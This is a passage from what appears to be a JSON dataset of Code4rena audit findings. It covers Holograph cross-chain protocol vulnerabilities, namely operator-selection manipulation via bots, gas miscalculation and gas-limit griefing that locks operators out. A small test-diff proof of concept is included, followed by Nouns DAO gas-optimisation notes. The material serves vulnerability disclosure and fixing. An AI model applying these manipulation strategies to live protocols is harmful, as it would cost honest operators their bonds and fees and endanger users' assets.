Total Pod |\n| ----- | ------- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --------- |\n| P0    | 10      | 615 | 0   | 0   | 0   | 0   | 0   | 0   | 0   | 0   | 0   | 615       |\n| P1    | 3       | 203 | 205 | 207 | X   | X   | X   | X   | X   | X   | X   | 615       |\n| P2    | 6       | 208 | 0   | 233 | 0   | 207 | 0   | X   | X   | X   | X   | 648       |\n| P3    | 9       | 61  | 62  | 69  | 70  | 65  | 69  | 61  | 60  | 54  | X   | 571       |\n| P4    | 4       | 300 | 0   | 292 | 0   | X   | X   | X   | X   | X   | X   | 592       |\n| P5    | 10      | 0   | 0   | 0   | 0   | 0   | 586 | 0   | 0   | 0   | 0   | 586       |\n| P6    | 2       | 602 | 0   | X   | X   | X   | X   | X   | X   | X   | X   | 602       |\n| P7    | 7       | 93  | 93  | 100 | 99  | 76  | 74  | 78  | X   | X   | X   | 613       |\n| P8    | 2       | 586 | 0   | X   | X   | X   | X   | X   | X   | X   | X   | 586       |\n| P9    | 6       | 0   | 190 | 0   | 189 | 0   | 192 | X   | X   | X   | X   | 571       |\n\nAt this stage, an attacker Mallory joins the protocol and scans the protocol (or interacts with - e.g. `getTotalPods`, `getPodOperatorsLength`). As an example, after considering the potential benefits, she chooses pod `P9` and sets up some bots `[B1, B2, B3]`. The number of Operators will determine the odds, so:\n\n| Pod P9 | Alt len | Op0 | Op1 | Op2 | Op3 | Op4 | Op5 | Op6 | Op7 | Op8 | Op9 | Total Pod |\n| ------ | ------- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --------- |\n| P9A    | 4       | 0   | 276 | 0   | 295 | X   | X   | X   | X   | X   | X   | 571       |\n| P9B    | 5       | 0   | 0   | 0   | 0   | 571 | X   | X   | X   | X   | X   | 571       |\n| P9     | 6       | 0   | 190 | 0   | 189 | 0   | 192 | X   | X   | X   | X   | 571       |\n| P9C    | 7       | 66  | 77  | 81  | 83  | 87  | 90  | 87  | X   | X   | X   | 571       |\n| P9D    | 8       | 0   | 127 | 0   | 147 | 0   | 149 | 0   | 148 | X   | X   | 571       |\n\nAnd then:\n\n1.  She waits for the next job to fall in `P9` and keeps an eye on the number of pods, since it could change the odds.\n2.  After an Operator is selected (he [pops](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L518) from the array), the number of available Operators change to 5, and the odds change to `P9B`.\n3.  She deploys `B1` and it goes to position `Op5`, odds back to `P9`. If the meantime the previously chosen Operator comes back to the `pod`, see the alternative timeline.\n4.  She now has 1/3 of the probability to be chosen for the next job:\n\n4.1 If she is not chosen, [she will assume the position](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L1138-L1144) of the chosen Operator, and deploys `B2` to maintain the odds of `P9` and controls 2/3 of the pod.\n4.2 If she is chosen, she chooses between employing another bot or waiting to execute the job to back to the pod (keeping the original odds).\n5\\. She can then iterate multiple times to swap to the remainder of possible indexes via step 4.1.\n\nAlternative timeline (from previous 3.):\n\n1.  The chosen Operator finishes the job and goes back to the pod. Now there's 7 members with uniform odds (`P9C`).\n2.  Mallory deploys `B2` and the length grows to 8, the odds turn to `P9D` and she now controls two of the four possible indexes from which she can be chosen.\n\nThere are a lot of ramifications and possible outcomes that Mallory can manipulate to increase the odds of being selected in her favor.\n\n### Recommended Mitigation Steps\n\nAs stated in [`M001-Biased distribution`](https://github.com/code-423n4/2022-10-holograph-findings/issues/167), use two random numbers for pod and Operator selection. Ideally, an independent source for randomness should be used, but following the assumption that the one used in [L499](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499) is safe enough, using the most significant bits (e.g. `random >> 128`) should guarantee an unbiased distribution. Also, reading the [EIP-4399](https://eips.ethereum.org/EIPS/eip-4399) could be valuable.\n\nAdditionally, since randomness in blockchain is always tricky to achieve without an oracle provider, consider adding additional controls (e.g. waiting times before joining each pod) to increase the difficulty of manipulating the protocol.\n\nAnd finally, in this particular case, removing the swapping mechanism (moving the last index to the chosen operator's current index) for another mechanism (shifting could also create conflicts [with backup operators?](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L358-L370)) could also increase the difficulty of manipulating a particular pod.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1296307048):**\n > Considering this as duplicate of [`#169`](https://github.com/code-423n4/2022-10-holograph-findings/issues/169) since they share the same root cause.\n\n**[ACC01ADE (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1308950227):**\n > Really love this analysis!\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1320926135):**\n > Judging this as high risk due to possible manipulation.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1321830898):**\n > Agree this is a high severity find. Believe issue [`#167`](https://github.com/code-423n4/2022-10-holograph-findings/issues/167) and this one are essentially different exploits of the same flaw and therefore should be bulked.<br>\n> Relevant org discussion [here](https://github.com/code-423n4/org/issues/8).\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1328123349):**\n > Agreed.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the Holograph Protocol, which is a decentralized protocol that allows users to securely transfer data between different blockchains. The vulnerability allows an attacker to manipulate each pod and gain an advantage over the remainder Operators.\n\nIn the code, each Operator is selected by generating a random number, selecting a pod by dividing the random with the total number of pods, and then selecting an Operator from the same pod using the same random number and dividing by the total number of operators. This creates an unintended bias since the same random number is used for both selecting the pod and selecting the Operator.\n\nAn attacker can take advantage of this by continuously monitoring the contracts state to see the current number of pods and Operators. They can join and leave a pod to increase their odds of being selected for a job, and can set up bots to control multiple Operators. This can lead to honest Operators feeling compelled to leave the protocol if there are no financial incentives, which can leave end-users at the hands of a malicious Operator.\n\nThe recommended mitigation steps are to use two random numbers for pod and Operator selection, and to consider adding additional controls to increase the difficulty of manipulating the protocol. Additionally, removing the swapping mechanism for another mechanism could also increase the difficulty of manipulating a particular pod.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/168",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "d3e4",
        "Lambda",
        "eighty"
      ]
    },
    {
      "id": "5588",
      "title": "[H-03]  LayerZeroModule miscalculates gas, risking loss of assets",
      "impact": "HIGH",
      "content": "\n[LayerZeroModule.sol#L431-L445](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L431-L445)<br>\n\nHolograph gets its cross chain messaging primitives through Layer Zero. To get pricing estimate, it uses the DstConfig price struct exposed in LZ's [RelayerV2](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/RelayerV2.sol#L133).\n\nThe issue is that the important baseGas and gasPerByte configuration parameters, which are used to calculate a custom amount of gas for the destination LZ message, use the values that come from the *source* chain. This is in contrast to LZ which handles DstConfigs in a mapping keyed by chainID.  The encoded gas amount is described [here](https://layerzero.gitbook.io/docs/guides/advanced/relayer-adapter-parameters).\n\n### Impact\n\nThe impact is that when those fields are different between chains, one of two things may happen:\n\n1.  Less severe - we waste excess gas, which is refunded to the lzReceive() caller (Layer Zero)\n2.  More severe - we underprice the delivery cost, causing lzReceive() to revert and the NFT stuck in limbo forever.\n\nThe code does not handle a failed lzReceive (differently to a failed executeJob). Therefore, no failure event is emitted and the NFT is screwed.\n\n### Recommended Mitigation Steps\n\nFirstly, make sure to use the target gas costs.<br>\nSecondly, re-engineer lzReceive to be fault-proof, i.e. save some gas to emit result event.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1297075073):**\n > Might also cause the LZ channel to stuck [`#244`](https://github.com/code-423n4/2022-10-holograph-findings/issues/244).\n\n**[ACC01ADE (Holograph) disputed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1308865449):**\n > I respectfully disagree that this is even a valid issue.<br>\n> @Trust - please re-review the affected code. You'll notice that we are in fact extracting destination chain gas data. And if you review the 100s of cross-chain testnet transactions that we have already made with that version of code, you will notice that the math is exact.\n>\n > Maybe I am misunderstanding something, so some clarification would be great if you think I'm wrong on this.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1308879405):**\n > Please take a look at `LayerZeroModule.sol`'s send function:\n> ```\n> function send(\n>   uint256, /* gasLimit*/\n>   uint256, /* gasPrice*/\n>   uint32 toChain,\n>   address msgSender,\n>   uint256 msgValue,\n>   bytes calldata crossChainPayload\n> ) external payable {\n>   require(msg.sender == address(_operator()), \"HOLOGRAPH: operator only call\");\n>   LayerZeroOverrides lZEndpoint;\n>   assembly {\n>     lZEndpoint := sload(_lZEndpointSlot)\n>   }\n>   // need to recalculate the gas amounts for LZ to deliver message\n>   lZEndpoint.send{value: msgValue}(\n>     uint16(_interfaces().getChainId(ChainIdType.HOLOGRAPH, uint256(toChain), ChainIdType.LAYERZERO)),\n>     abi.encodePacked(address(this), address(this)),\n>     crossChainPayload,\n>     payable(msgSender),\n>     address(this),\n>     abi.encodePacked(uint16(1), uint256(_baseGas() + (crossChainPayload.length * _gasPerByte())))\n>   );\n> }\n> ```\n> \n> The function uses `_baseGas()` and `_gasPerByte()` as the relayer adapter parameters as described in the submission description's link. These two getters are global for all chains.\n> \n> I agree that the `getMessage()` function takes into account the correct fees for the destination chain.\n\n**[ACC01ADE (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1308924550):**\n > @Trust - Ya but these refer to destination gas limits. BaseGas and GasPerByte is the amount of gas that is used by the `crossChainMessage` function that LayerZero triggers on cross-chain call [HolographOperator.sol#L484](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L484)\n\n**[ACC01ADE (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1308953994):**\n > Discussed this in more detail with @Trust, definitely a critical issue.<br>\n> Need to add destination chain-specific `_baseGas` and `_gasPerByte` to mitigate EVM differences in opcode costs.\n\n**[alexanderattar (Holograph) resolved](https://github.com/code-423n4/2022-10-holograph-findings/issues/445#event-7816582320):**\n > [Feature/HOLO-604: implementing critical issue fixes](https://github.com/holographxyz/holograph-protocol/pull/84)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the Layer Zero Module (LZ) of Holograph, which is a cross-chain messaging platform. It explains how the baseGas and gasPerByte configuration parameters, which are used to calculate the amount of gas for the destination LZ message, use the values from the source chain instead of the destination chain. This could lead to either wasting excess gas or underpricing the delivery cost, causing the NFTs to be stuck in limbo. The recommended mitigation steps are to make sure to use the target gas costs and re-engineer lzReceive to be fault-proof. Manual audit was used to identify the issue.",
      "quality_score": 5,
      "rarity_score": 2.9999975324757044,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/445",
      "tags": [
        "LayerZero",
        "Gas Limit"
      ],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "5587",
      "title": "[H-02] If user sets a low `gasPrice` the operator would have to choose between being locked out of the pod or executing the job anyway",
      "impact": "HIGH",
      "content": "\n[HolographOperator.sol#L202-L340](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L202-L340)<br>\n[HolographOperator.sol#L593-L596](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L593-L596)<br>\n[LayerZeroModule.sol#L277-L294](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L277-L294)<br>\n\nDuring the beaming process the user compensates the operator for the gas he has to pay by sending some source-chain-native-tokens via `hToken`.<br>\nThe amount he has to pay is determined according to the `gasPrice` set by the user, which is supposed to be the maximum gas price to be used on dest chain (therefore predicting the max gas fee the operator would pay and paying him the same value in src chain native tokens).<br>\nHowever, in case the user sets a low price (as low as 1 wei) the operator can't skip the job because he's locked out of the pod till he executes the job.<br>\nThe operator would have to choose between loosing money by paying a higher gas fee than he's compensated for or being locked out of the pod - not able to execute additional jobs or get back his bonded amount.<br>\n\n### Impact\n\nOperator would be losing money by having to pay gas fee that's higher than the compensation (gas fee can be a few dozens of USD for heavy txs).<br>\nThis could also be used by attackers to make operators pay for the attackers' expensive gas tasks:\n\n*   They can deploy their own contract as the 'source contract'\n*   Use the `bridgeIn` event and the `data` that's being sent to it to instruct the source contract what operations need to be executed\n*   They can use it for execute operations where the `tx.origin` doesn't matter (e.g. USDc gasless send)\n\n### Proof of Concept\n\n*   An operator can't execute any further jobs or leave the pod till the job is executed. From [the docs](https://docs.holograph.xyz/holograph-protocol/operator-network-specification#:\\~:text=When%20an%20operator%20is%20selected%20for%20a%20job%2C%20they%20are%20temporarily%20removed%20from%20the%20pod%2C%20until%20they%20complete%20the%20job.%20If%20an%20operator%20successfully%20finalizes%20a%20job%2C%20they%20earn%20a%20reward%20and%20are%20placed%20back%20into%20their%20selected%20pod.):\n\n> When an operator is selected for a job, they are temporarily removed from the pod, until they complete the job. If an operator successfully finalizes a job, they earn a reward and are placed back into their selected pod.\n\n*   Operator can't skip a job. Can't prove a negative but that's pretty clear from reading the code.\n*   There's indeed a third option - that some other operator/user would execute the job instead of the selected operator, but a) the operator would get slashed for that. b) If the compensation is lower than the gas fee then other users have no incentive to execute it as well.\n\n### Recommended Mitigation Steps\n\nAllow operator to opt out of executing the job if the `gasPrice` is higher than the current gas price.\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/364#issuecomment-1306348781):**\n > Is a known issue, and we will be fixing it.\n\n**[alexanderattar (Holograph) resolved](https://github.com/code-423n4/2022-10-holograph-findings/issues/364):**\n > [Feature/HOLO-604: implementing critical issue fixes](https://github.com/holographxyz/holograph-protocol/pull/84)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the Holograph protocol, which is a bridge between two blockchains. The bug occurs during the beaming process, when a user compensates the operator for the gas he has to pay by sending some source-chain-native-tokens via hToken. The amount the operator is paid is determined according to the gasPrice set by the user. However, if the user sets a low price, the operator is locked out of the pod until they execute the job, and may have to pay a higher gas fee than they are compensated for. This could be used by attackers to make operators pay for expensive gas tasks, such as USDc gasless send. \n\nThe recommended mitigation step for this bug is to allow operators to opt out of executing the job if the gasPrice is higher than the current gas price.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/364",
      "tags": [
        "Gas Price",
        "Business Logic"
      ],
      "finders": [
        "0xA5DF",
        "cryptphi",
        "Jeiwan",
        "Picodes"
      ]
    },
    {
      "id": "5586",
      "title": "[H-01] An attacker can lock operator out of the pod by setting gas limit that's higher than the block gas limit of dest chain",
      "impact": "HIGH",
      "content": "\n[HolographOperator.sol#L415](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L415)<br>\n\nWhen a beaming job is executed, there's a requirement that the gas left would be at least as the `gasLimit` set by the user.\nGiven that there's no limit on the `gasLimit` the user can set, a user can set the `gasLimit` to amount that's higher than the block gas limit on the dest chain, causing the operator to fail to execute the job.\n\n### Impact\n\nOperators would be locked out of the pod, unable to execute any more jobs and not being able to get back the bond they paid.\n\nThe attacker would have to pay a value equivalent to the gas fee if that amount was realistic (i.e. `gasPrice` &ast; `gasLimit` in dest chain native token), but this can be a relative low amount for Polygon and Avalanche chain (for Polygon that's 20M gas limit and `200 Gwei gas = 4 Matic`, for Avalanche the block gas limit seems to be 8M and the price `~30 nAVAX = 0.24 AVAX`). Plus, the operator isn't going to receive that amount.\n\n### Proof of Concept\n\nThe following test demonstrates this scenario:\n\n```diff\ndiff --git a/test/06_cross-chain_minting_tests_l1_l2.ts b/test/06_cross-chain_minting_tests_l1_l2.ts\nindex 1f2b959..a1a23b7 100644\n--- a/test/06_cross-chain_minting_tests_l1_l2.ts\n+++ b/test/06_cross-chain_minting_tests_l1_l2.ts\n@@ -276,6 +276,7 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {\n             gasLimit: TESTGASLIMIT,\n           })\n         );\n+        estimatedGas = BigNumber.from(50_000_000);\n         // process.stdout.write('\\n' + 'gas estimation: ' + estimatedGas.toNumber() + '\\n');\n \n         let payload: BytesLike = await l1.bridge.callStatic.getBridgeOutRequestPayload(\n@@ -303,7 +304,8 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {\n             '0x' + remove0x((await l1.operator.getMessagingModule()).toLowerCase()).repeat(2),\n             payload\n           );\n-\n+        estimatedGas = BigNumber.from(5_000_000);\n+        \n         process.stdout.write(' '.repeat(10) + 'expected lz gas to be ' + executeJobGas(payload, true).toString());\n         await expect(\n           adminCall(l2.mockLZEndpoint.connect(l2.lzEndpoint), l2.lzModule, 'lzReceive', [\n@@ -313,7 +315,7 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {\n             payload,\n             {\n               gasPrice: GASPRICE,\n-              gasLimit: executeJobGas(payload),\n+              gasLimit: 5_000_000,\n             },\n           ])\n         )\n```\n\nThe test would fail with the following output:\n\n      1) Testing cross-chain minting (L1 & L2)\n           Deploy cross-chain contracts via bridge deploy\n             hToken\n               deploy l1 equivalent on l2:\n         VM Exception while processing transaction: revert HOLOGRAPH: not enough gas left\n\n### Recommended Mitigation Steps\n\nLimit the `gasLimit` to the maximum realistic amount that can be used on the dest chain (including the gas used up to the point where it's checked).\n\n**[ACC01ADE (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/414#issuecomment-1308900212):**\n > Good idea to generally limit the maximum gas allowed in an operator job.\n>\n > [Feature/HOLO-604: implementing critical issue fixes](https://github.com/holographxyz/holograph-protocol/pull/84)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the HolographOperator.sol code on the GitHub repository. When a beaming job is executed, there is a requirement that the gas left must be at least as much as the gasLimit set by the user. There is no limit on the gasLimit, so an attacker can set it to a value higher than the block gas limit on the dest chain, which will cause the operator to fail to execute the job. This would lock the operator out of the pod, unable to execute any more jobs and unable to get back the bond they paid. The attacker would have to pay a value equivalent to the gas fee, but this can be a relatively low amount for Polygon and Avalanche chain. \n\nThe bug is demonstrated by a proof of concept, which includes a diff file showing the changes made to the code. The output of the test shows that the transaction fails with a “VM Exception”. \n\nThe recommended mitigation steps to this vulnerability are to limit the gasLimit to the maximum realistic amount that can be used on the dest chain, including the gas used up to the point where it is checked.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/414",
      "tags": [
        "Gas Limit"
      ],
      "finders": [
        "0xA5DF",
        "0x52"
      ]
    },
    {
      "id": "24484",
      "title": "[G-23]  Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\n\n*There are 95 instances of this issue.*\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24483",
      "title": "[G-22]  Empty blocks should be removed or emit something",
      "impact": "GAS",
      "content": "The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be `abstract` and the function signatures be added without any default implementation. If the block is an empty `if`-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`). Empty `receive()`/`fallback() payable` functions that are not used, can be removed to save deployment gas.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/governance/NounsDAOLogicV2.sol\n\n1030:     receive() external payable {}\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L1030\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24482",
      "title": "[G-21]  `require()` or `revert()` statements that check input arguments should be at the top of the function",
      "impact": "GAS",
      "content": "Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (**2100 gas***) in a function that may ultimately revert in the unhappy case.\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24481",
      "title": "[G-20]  Division by two should use bit shifting",
      "impact": "GAS",
      "content": "`<x> / 2` is the same as `<x> >> 1`. While the compiler uses the `SHR` opcode to accomplish both, the version that uses division incurs an overhead of [**20 gas**](https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff) due to `JUMP`s to and from a compiler utility function that introduces checks which can be avoided by using `unchecked {}` around the division by two\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24480",
      "title": "[G-19]  Don't compare boolean expressions to boolean literals",
      "impact": "GAS",
      "content": "`if (<x> == true)` => `if (<x>)`, `if (<x> == false)` => `if (!<x>)`\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24479",
      "title": "[G-18]  Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table\n\n*There are 31 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24478",
      "title": "[G-17]  Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\nEach operation involving a `uint8` costs an extra [**22-28 gas**](https://gist.github.com/IllIllI000/9388d20c70f9a4632eb3ca7836f54977) (depending on whether the other operand is also a variable of type `uint8`) as compared to ones involving `uint256`, due to the compiler having to clear the higher bits of the memory word before operating on the `uint8`, as well as the associated stack operations of doing so. Use a larger size then downcast where needed\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/base/ERC721Checkpointable.sol\n\n/// @audit uint32 upper\n191:                  upper = center - 1;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L191\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24477",
      "title": "[G-16]  Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "See [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by **3 gas**\n\n*There are 19 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24476",
      "title": "[G-15]  `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "Saves **5 gas per loop**\n\n*There are 10 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24475",
      "title": "[G-14]  Use a more recent version of solidity",
      "impact": "GAS",
      "content": "Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining\nUse a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads\nUse a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/base/ERC721Enumerable.sol\n\n28:   pragma solidity ^0.8.0;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Enumerable.sol#L28\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24474",
      "title": "[G-13]  Optimize names to save gas",
      "impact": "GAS",
      "content": "`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)\n\n*There are 5 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24473",
      "title": "[G-12]  `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**\n\n*There are 86 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24472",
      "title": "[G-11]  `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
      "impact": "GAS",
      "content": "The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**\n\n*There are 8 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
